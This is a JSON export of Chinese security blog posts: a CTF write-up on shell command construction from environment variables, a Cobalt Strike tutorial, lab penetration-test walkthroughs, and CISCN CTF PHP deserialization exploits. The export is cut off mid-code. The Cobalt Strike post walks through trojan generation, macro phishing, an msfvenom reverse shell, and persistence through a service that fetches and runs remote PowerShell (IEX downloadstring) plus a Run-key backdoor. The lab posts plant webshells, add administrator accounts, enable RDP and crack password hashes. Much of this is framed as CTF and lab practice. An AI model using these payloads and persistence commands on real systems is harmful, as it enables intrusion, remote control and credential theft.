[{"title":"CTFSHOWweb月饼杯web3引发的问题","url":"/2020/10/02/CTFshow_webfirst_wp/","content":"\n起因是平台上羽师傅出的一道环境变量截取和linux通配符的题，原题是平台月饼杯的web3_莫负婵娟。\n\n简单介绍一下环境变量截取构造。\n\n我们都知道linux中有个环境变量`$PATH`，它决定了shell将到哪些目录中寻找命令或程序，一般是这样\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201002163306.png)\n\n而linux中，我们是可以通过`$`和`{}`来提取环境变量中某个或者某些字符串的，比如\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201002163837.png)\n\n因此，按照这种构造方式，我们就可以构造出诸如ls，cat之类的命令，从而达到命令执行的目的\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201002164158.png)\n\n当然还有更多的截取方式\n\n```\n${file#*/}：删掉第一个 / 及其左边的字符串：dir1/dir2/dir3/my.file.txt\n${file##*/}：删掉最后一个 /  及其左边的字符串：my.file.txt\n${file#*.}：删掉第一个 .  及其左边的字符串：file.txt\n${file##*.}：删掉最后一个 .  及其左边的字符串：txt\n${file%/*}：删掉最后一个  /  及其右边的字符串：/dir1/dir2/dir3\n${file%%/*}：删掉第一个 /  及其右边的字符串：(空值)\n${file%.*}：删掉最后一个  .  及其右边的字符串：/dir1/dir2/dir3/my.file\n${file%%.*}：删掉第一个  .   及其右边的字符串：/dir1/dir2/dir3/my\n```\n\n具体请看[参考](https://www.shuzhiduo.com/A/B0zqQamGzv/)，这里只讨论其中一两种方式\n\n按照上述方法，可以构造得到payload\n\n```\n?ip=0;${PATH:5:1}${PATH:2:1}  //0;ls\n```\n\n```\nip=0;${PATH:14:1}${PATH:5:1} ????.??? //0;nl ????.??? (通配符匹配)\n```\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201002164338.png)\n\n但这种截取环境变量的方式在做羽师傅续出的web入门题月饼杯web3's revenge出了问题。\n\n首先打开题目直接是到了月饼杯web3的第二关，并且查看源码提示了信息是命令执行\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201002165244.png)\n\n那么有了上道题的经验，有没有可能再次构造出相应的payload呢，不妨试一下\n\n首先fuzz一下题目过滤了哪些字符\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201002165451.png)\n\n发现，除了几个`?`,`{}`,`~`,`#`符号之外，只允许输入大写字母，显然之前用数字截取的方式不再适用\n\n那么注意点放到了这几个仅存的字符上，首先是`~`，在实际测试中发现当使用取反对变量进行截取，可以输出变量中的最后一位，比如\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201002170118.png)\n\n而有些环境变量比如`$SHELL`，`$SHLVL`在大多数环境中是通用的，因此我们就多了几个可以利用的字母\n\n再看到`#`号，上面的参考文章中已经知道，`#`可以用来截取变量，比如说`echo ${var#*//}`是删除左边字符，保留右边字符。而当我再把`#`号放到变量左边时，有了意外的结果\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201002171138.png)\n\n得到了数字！而且9正是`$PATH`中我想要的数字中字母`l`的位置，那么如果我们把这个截取字符串作为截取过程中`:`的参数，这个截取有没有效呢，答案是肯定的\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201002171950.png)\n\nnice了，那么现在就可以构造了，看着几个固定的环境变量，构造出了下面的payload\n\n```\n${PATH:~A}${PATH:${#SHELL}:${SHLVL:~A}}  //nl   \n```\n\n```\n${PATH:${#SHELL}:${SHLVL:~A}}${PATH:${#_}:${SHLVL:~A}} //ls\n```\n\nps：值得提醒的是，有些环境变量在具体的环境中数值是不一样的，所以有可能失效，所有要视自己的环境而定，我这测试了两台虚拟机\n\n在命令行试了下可以看到是有效的\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201002172932.png)\n\n那么问题就来了，把payload传进入打不通（难受。。。。）\n\n后来问了出题人也说payload没问题，docker可以打通，可能就是php的问题，后来在php中试了下，确实有问题\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201002204235.png)\n\n搜了下这个报错，大概是与linux shell使用的是/bin/sh，还是/bin/bash有关系。。。。\n\n那也没办法处理只好到这里了，虽然没做出来，好在也算学到了个新姿势","tags":["linux变量截取"],"categories":["CTF"]},{"title":"cobalt_strike基本使用","url":"/2020/09/27/cs_learn_note/","content":"\n### 安装\n\n百度的汉化破解版，[源地址](https://www.nctry.com/1744.html)\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927082243.png)\n\n下载下来可以看到有挺多文件，但我们只需要关注两个文件即可，start和teamserver\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927082403.png)\n\n简单介绍下，Cobalt Strike是一款基于java的渗透测试工具，也就是经常在大佬文章中出现的称为CS的神器。它分为客户端和服务端，服务端的关键文件是teamserver和cobaltstrike.jar，而客户端只需在主机上执行start，然后连接服务端即可，通过这种模式，多个客户端可以连接到一个服务端，使得团队成员之间可以共享攻击资源与目标信息和sessions，提升效率。\n\n这里演示下连接效果，以linux服务端为例（当然windows也可以，上面我们可以看到作者已经给我们创建好了bat文件）\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927085932.png)\n\n查看本机ip地址，执行命令\n\n```\n./teamserver ip password #password自定义\n```\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927090150.png)\n\n客户端运行start.bat，填写相应连接信息\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927090514.png)\n\n点击连接，成功上线\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927090609.png)\n\n### 基本使用\n\n已经是中文版，就方便很多了，这里实践一下百度的一些常用方法\n\n参考:[1](https://blog.csdn.net/weixin_44677409/article/details/102725129)，[2](https://www.freebuf.com/vuls/224507.html)，[3](https://blog.csdn.net/weixin_44677409/article/details/102725418)\n\n#### 上线肉鸡\n\n##### 创建监听器\n\nCobalt Strike-->监听器-->add-->save\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927092754.png)\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927092928.png)\n\n##### 生成木马\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927093743.png)\n\n方式选择powershell\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927094219.png)\n\nGenerate生成\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927094313.png)\n\n##### 生成web链接\n\n用刚刚生成的文件生成下载链接\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927094522.png)\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927094754.png)\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927094817.png)\n\n##### 运行木马\n\n在目标主机上运行mshta命令。mshta.exe是微软Windows操作系统相关程序，用于执行.HTA文件。\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927095101.png)\n\n回车，返回Cobalt Strike即可看见肉鸡成功上线\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927095156.png)\n\n点击进入beacon使用shell+命令即可执行交互\n\n这里借用一下[大佬](https://blog.csdn.net/weixin_44677409/article/details/102725129)的命令表\n\n```\nBeacon Commands\n===============\n\n    Command                   Description\n    -------                   -----------\n    argue                     进程参数欺骗\n    blockdlls                 在子进程中阻止非Microsoft的DLLs文件\n    browserpivot              注入受害者浏览器进程\n    bypassuac                 绕过UAC\n    cancel                    取消正在进行的下载\n    cd                        切换目录\n    checkin                   强制让被控端回连一次\n    clear                     清除beacon内部的任务队列\n    connect                   通过TCP连接到Beacon\n    covertvpn                 部署Covert VPN客户端\n    cp                        复制文件\n    dcsync                    从DC中提取密码哈希\n    desktop                   远程VNC\n    dllinject                 反射DLL注入进程\n    dllload                   使用LoadLibrary将DLL加载到进程中\n    download                  下载文件\n    downloads                 列出正在进行的文件下载\n    drives                    列出目标盘符\n    elevate                   尝试提权\n    execute                   在目标上执行程序(无输出)\n    execute-assembly          在目标上内存中执行本地.NET程序\n    exit                      退出beacon\n    getprivs                  对当前令牌启用系统权限\n    getsystem                 尝试获取SYSTEM权限\n    getuid                    获取用户ID\n    hashdump                  转储密码哈希值\n    help                      帮助\n    inject                    在特定进程中生成会话\n    jobkill                   杀死一个后台任务\n    jobs                      列出后台任务\n    kerberos_ccache_use       从ccache文件中导入票据应用于此会话\n    kerberos_ticket_purge     清除当前会话的票据\n    kerberos_ticket_use       从ticket文件中导入票据应用于此会话\n    keylogger                 键盘记录\n    kill                      结束进程\n    link                      通过命名管道连接到Beacon\n    logonpasswords            使用mimikatz转储凭据和哈希值\n    ls                        列出文件\n    make_token                创建令牌以传递凭据\n    mimikatz                  运行mimikatz\n    mkdir                     创建一个目录\n    mode dns                  使用DNS A作为通信通道(仅限DNS beacon)\n    mode dns-txt              使用DNS TXT作为通信通道(仅限D beacon)\n    mode dns6                 使用DNS AAAA作为通信通道(仅限DNS beacon)\n    mode http                 使用HTTP作为通信通道\n    mv                        移动文件\n    net                       net命令\n    note                      给当前目标机器备注       \n    portscan                  进行端口扫描\n    powerpick                 通过Unmanaged PowerShell执行命令\n    powershell                通过powershell.exe执行命令\n    powershell-import         导入powershell脚本\n    ppid                      为生成的post-ex任务设置父PID\n    ps                        显示进程列表\n    psexec                    使用服务在主机上生成会话\n    psexec_psh                使用PowerShell在主机上生成会话\n    psinject                  在特定进程中执行PowerShell命令\n    pth                       使用Mimikatz进行传递哈希\n    pwd                       当前目录位置\n    reg                       查询注册表\n    rev2self                  恢复原始令牌\n    rm                        删除文件或文件夹\n    rportfwd                  端口转发\n    run                       在目标上执行程序(返回输出)\n    runas                     以另一个用户权限执行程序\n    runasadmin                在高权限下执行程序\n    runu                      在另一个PID下执行程序\n    screenshot                屏幕截图\n    setenv                    设置环境变量\n    shell                     cmd执行命令\n    shinject                  将shellcode注入进程\n    shspawn                   生成进程并将shellcode注入其中\n    sleep                     设置睡眠延迟时间\n    socks                     启动SOCKS4代理\n    socks stop                停止SOCKS4\n    spawn                     生成一个会话 \n    spawnas                   以其他用户身份生成会话\n    spawnto                   将可执行程序注入进程\n    spawnu                    在另一个PID下生成会话\n    ssh                       使用ssh连接远程主机\n    ssh-key                   使用密钥连接远程主机\n    steal_token               从进程中窃取令牌\n    timestomp                 将一个文件时间戳应用到另一个文件\n    unlink                    断开与Beacon的连接\n    upload                    上传文件\n    wdigest                   使用mimikatz转储明文凭据\n    winrm                     使用WinRM在主机上生成会话\n    wmi                       使用WMI在主机上生成会话\n```\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927095923.png)\n\n#### socks代理\n\n开启sock代理\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927101318.png)\n\n主机配置proxychains.conf\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927101306.png)\n\nnmap扫描内网存活主机\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927101725.png)\n\n#### Metasploit联动\n\n##### CS木马msf监听\n\nmsf开启监听\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927105130.png)\n\nCobalt Strike上创建两个监听器，windows/beacon_http/reverse_http来监听肉鸡，windows/foreign/reverse_http来将获取到的控制权传给msf(端口与msf监听的端口一致)\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927105650.png)\n\n选择foreign监听器生成木马在主机上执行\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927110336.png)\n\n主机上执行可以看到成功获取会话\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927110621.png)\n\n但就像博主说的，会话极其不稳定，马上就断开了\n\n##### msf生成木马CS监听\n\n```\nmsfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.126.128 lport=6666 -f exe -o msf.exe\n```\n\ncs生成链接\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927111407.png)\n\n目标主机访问链接运行\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927111710.png)\n\n返回msf可以看到已经获取会话\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927111800.png)\n\n#### 宏钓鱼\n\n选择office方式\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927144456.png)\n\n点击生成之后弹出提示框告诉我们步骤\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927144601.png)\n\n首先随便打开一个word或者office，查看macros\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927144814.png)\n\n随意命名，打开到this document，回到cs复制macro，粘贴\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927145103.png)\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927145149.png)\n\n关闭另存为启用宏的word文档\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927145247.png)\n\n目标主机打开这个带有恶意宏的文档即可上线\n\n#### shellcode\n\nCS支持生成多种语言的shellcode\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927145749.png)\n\n比如powershell\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927145926.png)\n\n将payload.ps1复制到目标系统并执行以下命令\n\n```\npowershell –exec bypass –Command \"& {Import-Module 'C:\\payload.ps1'}\"\n```\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927150144.png)\n\n返回CS即可看到返回会话\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927150217.png)\n\n### 提权\n\nCS内置两个exp\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927150616.png)\n\n通过[项目](https://github.com/rsmudge/ElevateKit)可以导入脚本文件来扩展漏洞库，点击Cobalt Strike中的脚本管理器，点击load加载下来的cna文件\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927150958.png)\n\n选择相应的exp即可尝试提权\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927151052.png)\n\n### 权限维持\n\n目的是即使目标主机重启，依旧能保持目标的控制权\n\n##### 设置服务后门\n\n生成一个服务器的恶意脚本\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927151551.png)\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927151649.png)\n\n复制生成的命令在目标主机上执行\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927151825.png)\n\n返回同样上线主机，但只有普通用户的权限，因此想要完成以下的操作需要提权，我这里因为是虚拟机，直接管理员运行了\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927152932.png)\n\n打开beacon shell并执行命令\n\n```\nshell sc create \"blacknight\" binpath= \"cmd /c start powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://192.168.183.148:80/a'))\\\"\"\n```\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927153143.png)\n\n执行成功，这时查看目标主机的服务信息发现一个名为blacknight的服务已经创建了\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927153253.png)\n\n但还是手动的，因此我们需要把他设为自动\n\n执行命令\n\n```\nshell sc config \"name\" start= auto\n```\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927153402.png)\n\n这是再返回主机查看可以看到已经变成自动的了\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927153453.png)\n\n这样就设置好了一个服务后门。\n\n##### 设置注册表后门\n\n首先在CS上生成一个恶意可执行文件上传到服务器上\n\n右键打开文件管理\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927153949.png)\n\n点击下方的upload将恶意文件上传到主机上\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927154045.png)\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927154026.png)\n\n执行命令\n\n```\n shell reg add HKLM_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v \"keyname\" /t REG_SZ /d \"C:\\Users\\15363\\Desktop\\artifact.exe\" /f\n```\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927154224.png)\n\n打开主机注册表编辑器可以看到已经写入成功\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200927155036.png)\n\n就跟着做到这里吧，总算是熟悉了一下会用了，以后有啥高级用法另开。","tags":["cobaltstrike"],"categories":["渗透测试"]},{"title":"i春秋刷题——综合渗透测试实验","url":"/2020/09/20/ichunqiu_sum/","content":"\n### 我很简单，请不要欺负我\n\n第一题awvs是一个漏洞扫描工具\n\n第二题：\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200819093619.png)\n\n一个asp网站，用旁注检测工具检测到有注入\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200819105424.png)\n\n一把梭得到admin密码，md5解密得admin888\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200819105542.png)\n\n登录到后台\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200819105859.png)\n\n试着上传shell，把上传文件限制加上一条php，找下有没有上传点\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200819111142.png)\n\n无果，百度下，采用修改配置文件的方法获取WebShell\n\n在系统设置将网站首页改为一句话木马\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200819112528.png)\n\n菜刀连接inc/config.asp（配置文件位置），连接密码是#，成功getshell\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200819112709.png)\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200819112805.png)\n\n应该是要获取服务器管理员密码，也就是提权。\n\n尝试pr提权，首先上传pr.exe到，那就先找有写入权限得目录\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200819113243.png)\n\n切换虚拟终端，拒绝访问，可能是被管理员移除了cmd，那么上传cmd.exe\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200819113744.png)\n\n使用pr.exe执行命令，`PR.exe \"net user blacknight 123456 /add\"`添加用户\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200819115243.png)\n\n给添加的用户赋予管理员权限，`PR.exe \"net localgroup Administrators blacknight /add\"`\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200819115251.png)\n\n然后尝试开启远程登录权限，上传3389批处理文件\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200819120513.png)\n\n再pr运行3389.exe\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200819120655.png)\n\n现在尝试cmd运行mstsc启动远程连接程序，ipconfig查看靶机地址，连接成功，输入刚才创建的用户名密码登录\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200819120859.png)\n\n那么现在获取本地哈希了，工具cain可以获取本地hash并支持爆破，首先找个目录上传\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200819121046.png)\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200819121353.png)\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200819121411.png)\n\n安装之后打开，注意这里要选不受限的方式\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200819121629.png)\n\n再获取本地密码哈希\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200819121728.png)\n\n右键导出即可看到各个用户的密码哈希\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200819121915.png)\n\n把administrator的哈希放到在线网站破解即可（\":\"后面的数值）\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200819122225.png)\n\n完成\n\n### 网站综合渗透实验\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920154337.png)\n\n扫一波后台，发现admin\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920154611.png)\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920154704.png)\n\n告诉我们管理员用户名是linhai，但是有验证码，抓包看看验证码是什么逻辑\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920155259.png)\n\n看到s和s2想到可以爆破，但提示信息啥的全都乱码，爆破了一下也没什么结果，换个思路吧\n\n点了几下发现asp有挺多参数，用旁注检测下\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920161346.png)\n\n那么随便点一个跑一下，得到用户名和密码的hash\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920161503.png)\n\npmd5查一下，得到密码\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920161653.png)\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920161950.png)\n\n看第二题\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920162020.png)\n\n在后台找找有没有上传什么的\n\n首先是添加图片\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920165908.png)\n\n上传之后啥也没有，回到首页也没找到上传的图片，同样的下面几项也没什么变化，继续翻\n\n找到了添加文件，试着写入一句话看看\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920170301.png)\n\n查看源码发现已经被转义了，失败\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920170430.png)\n\n来到系统信息，logo处还有一个上传\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920170630.png)\n\n可以上传，并且点击生成代码还给出了上传信息，有戏\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920170736.png)\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920170757.png)\n\n那么现在就是怎么把这个图片解析成asp的问题了，我们注意到下面还有个数据库备份功能\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920170924.png)\n\n假如我们把数据库路径改成我们的图片马，是不是就可以转换成asp保存下来了呢，用刚才的路径试一下\n\n默认给出的路径是../db，也就是admin目录下，那么我们只要把数据库路径改成upfiles/202092077303.jpg，备份地址改成upfiles/202092077303.asp即可\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920173240.png)\n\n访问下upfiles/202092077303.asp，已经成功转换为asp了\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920173403.png)\n\n那么做个图片马上传再同样操作即可\n\n这里制作图片马的时候遇到了点麻烦，一开始用copy命令或者直接文本打开图片加上一句话木马转换之后报错\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920184544.png)\n\n猜想可能是jpg备份成asp出了啥问题，所以改下，直接创建一个1.jpg，直接写一句话传不上去，把一句话尽可能写多一点\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920185639.png)\n\n这下解析了，菜刀连接即可\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920185714.png)\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920185728.png)\n\n成功getshell，那么第三题\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920185805.png)\n\n数据库文件一般都要conn*什么的，找一下\n\n最后在wwwroot下的conn_old.asp里找到密码linhai123456woaini\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920190138.png)\n\n最后一题\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920190802.png)\n\n可以看到权限非常低\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920190934.png)\n\n这个命令行不让用，我们上传一个cmd.exe试试，那么首先需要找到有上传权限的目录\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920191442.png)\n\n右键cmd.exe打开虚拟终端\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920191518.png)\n\n现在有终端了，systeminfo查看下系统信息\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920191720.png)\n\n电脑版本是win server 2003 sp2，并且只打了一个补丁\n\n在[提权辅助工具](https://bugs.hacking8.com/)，输入补丁信息\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920191946.png)\n\n找到如下信息，因为补丁打的太少，可能的exp太多，其中包括wp中其他师傅写的MS09-012\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920193801.png)\n\n直接跟着MS09-012的来了\n\n目录下再次上传Churrasco.exe和3389.bat\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920195929.png)\n\n用Churrasco.exe添加账户\n\n```\nChurrasco.exe \"net user blacknight 123456 /add\"\n```\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920200148.png)\n\n将新增的账户添加到管理员组\n\n```\nChurrasco.exe \"net localgroup administrators blacknight /add\"\n```\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920200413.png)\n\n现在有个账户，那么尝试远程登录，先开启3389\n\n```\nChurrasco.exe 3389.bat\n```\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920200746.png)\n\nipconfig查看本机ip地址\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920200855.png)\n\n本机cmd运行mstsc远程连接，用刚才创建的账户登录\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920200930.png)![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200920200958.png)\n\n那么现在获取管理员hash即可，同样可以使用工具cain，过程和上个实验一样，做到这实验环境崩了，就这样吧。","categories":["ichunqiu综合渗透练习"]},{"title":"CISCN2020初赛web总结","url":"/2020/08/24/ciscn_online/","content":"\n又是被大佬带飞的一天\n\n### babyphp\n\n```php\n<?php\n    //题目环境：php:7.4.8-apache\n    $pid = pcntl_fork();\n    if ($pid == -1) {\n        die('could not fork');\n    }else if ($pid){\n        $r=pcntl_wait($status);\n        if(!pcntl_wifexited($status)){\n            phpinfo();\n        }\n    }else{\n        highlight_file(__FILE__);\n        if(isset($_GET['a'])&&is_string($_GET['a'])&&!preg_match(\"/[:\\\\\\\\]|exec|pcntl/i\",$_GET['a'])){\n            call_user_func_array($_GET['a'],[$_GET['b'],false,true]);\n        }\n        posix_kill(posix_getpid(), SIGUSR1);\n    }\n```\n\n父进程调用了pntcl_wait，之后调用pcntl_wifexited，子进程如果异常退出，父进程就会展示phpinfo，用一些disable_functionFuzz了一下a，直接到pfsockopen导致进程异常终止直接输出phpinfo了，Ctrl+f搜索flag\n\n![img](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/clip_image002.jpg)\n\n大概就是函数造成回调使得进程异常退出，代码就执行phpinfo了，类似的函数还有stream_socket_client\n\n### babyunserialize\n\ndirsearch扫出www.zip，下载源码下来发现是和WMCTF2020 webweb一样的框架，代码也没怎么改，所有利用链可以一样，[参考](http://blog.ccreater.top/)\n\n后来传入的时候发现把很多函数都过滤了，最后是想到phpinfo也算函数，再给它传个整数，成功得到phpinfo\n\n```php\n<?php\nnamespace DB{\n    abstract class Cursor  implements \\IteratorAggregate {}\n}\nnamespace DB\\SQL{\n    class Mapper extends \\DB\\Cursor{\n        protected\n            $props=[\"quotekey\"=>\"phpinfo\"],\n            $adhoc=[\"123\"=>[\"expr\"=>\"\"]],\n            $db;\n        function offsetExists($offset){}\n        function offsetGet($offset){}\n        function offsetSet($offset, $value){}\n        function offsetUnset($offset){}\n        function getIterator(){}\n        function __construct($val){\n            $this->db = $val;\n        }\n    }\n}\nnamespace CLI{\n    class Agent {\n        protected\n            $server=\"\";\n        public $events;\n        public function __construct(){\n            $this->events=[\"disconnect\"=>array(new \\DB\\SQL\\Mapper(new \\DB\\SQL\\Mapper(\"\")),\"find\")];\n            $this->server=&$this;\n        }\n    };\n    class WS{}\n}\nnamespace {\n    echo urlencode(serialize(array(new \\CLI\\WS(),new \\CLI\\Agent())));\n}\n```\n\n看着师傅们的wp分析下应该是预期解的笔记吧\n\n全局搜索destruct函数\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824160225.png)\n\n跟进write\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824162040.png)\n\n又调用了Base的write方法，继续跟进\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824162233.png)\n\n$file和$data都可控，exp:\n\n![](https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200824162555.png)\n\n```php\n<?php\nnamespace DB;\nclass Jig {\n    const\n        FORMAT_JSON=0,\n        FORMAT_Serialized=1;\n    protected\n        $dir = '/var/www/html/',\n        $format = self::FORMAT_JSON,\n        $data = array(\"blacknight.php\"=>array(\"a\"=>\"<?php phpinfo();?>\")),\n        $lazy = 1;\n}\n$jig = new Jig();\necho urlencode(serialize($jig));\n```\n\n### rceme\n\n```php\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\nparserIfLabel($_GET['a']);\nfunction danger_key($s) {\n    $s=htmlspecialchars($s);\n    $key=array('php','preg','server','chr','decode','html','md5','post','get','request','file','cookie','session','sql','mkdir','copy','fwrite','del','encrypt','$','system','exec','shell','open','ini_','chroot','eval','passthru','include','require','assert','union','create','func','symlink','sleep','ord','str','source','rev','base_convert');\n    $s = str_ireplace($key,\"*\",$s);\n    $danger=array('php','preg','server','chr','decode','html','md5','post','get','request','file','cookie','session','sql','mkdir','copy','fwrite','del','encrypt','$','system','exec','shell','open','ini_','chroot','eval','passthru','include','require','assert','union','create','func','symlink','sleep','ord','str','source','rev','base_convert');\n    foreach ($danger as $val){\n        